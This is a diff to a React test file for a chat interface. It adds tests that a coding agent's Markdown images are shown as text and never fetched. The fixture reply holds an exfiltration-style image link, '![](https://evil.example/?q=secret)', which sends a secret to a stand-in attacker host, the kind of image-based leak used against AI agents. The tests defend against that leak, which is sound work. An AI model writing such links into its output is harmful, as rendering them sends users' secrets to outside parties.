@@ -6,7 +6,7 @@
  * it off, and the table enlarge dialog. Asserted through roles and text only.
  */
 
-import { chatMarkdownComponents } from "@neore/ui/components/chat-markdown-components";
+import { chatMarkdownComponents, hostMarkdownComponents } from "@neore/ui/components/chat-markdown-components";
 import { DEFAULT_STREAMDOWN_APPEARANCE, setStreamdownAppearance } from "@neore/ui/hooks/use-streamdown-appearance";
 import { act, fireEvent, render, screen } from "@testing-library/react";
 import { Streamdown } from "streamdown";
@@ -112,5 +112,36 @@ describe("chat text direction", () => {
         const code = screen.queryByRole("code");
 
         expect(code?.getAttribute("dir") ?? null).toBeNull();
+    });
+});
+
+describe("a coding agent's Markdown images", () => {
+    const reply = "A chart ![chart](out/chart.png) and a pixel ![](https://evil.example/?q=secret).";
+
+    const renderWith = async (components: typeof chatMarkdownComponents) => {
+        const { container } = render(
+            <Streamdown codeBlockMaxHeight="none" components={components} lineNumbers={false}>
+                {reply}
+            </Streamdown>,
+        );
+
+        await settle();
+
+        return container;
+    };
+
+    it("are shown as the Markdown they are, and no image element is created to fetch anything", async () => {
+        const container = await renderWith(hostMarkdownComponents);
+
+        expect(container.querySelector("img")).toBeNull();
+        // A path is blocked by Streamdown itself; a remote address is shown by ours, so it is never fetched.
+        expect(container.textContent).toContain("chart");
+        expect(container.textContent).toContain("![](https://evil.example/?q=secret)");
+    });
+
+    it("are still loaded in an ordinary reply, which is why a host's reply gets the other renderer", async () => {
+        const container = await renderWith(chatMarkdownComponents);
+
+        expect(container.querySelector("img[src^='https://evil.example']")).not.toBeNull();
     });
 });
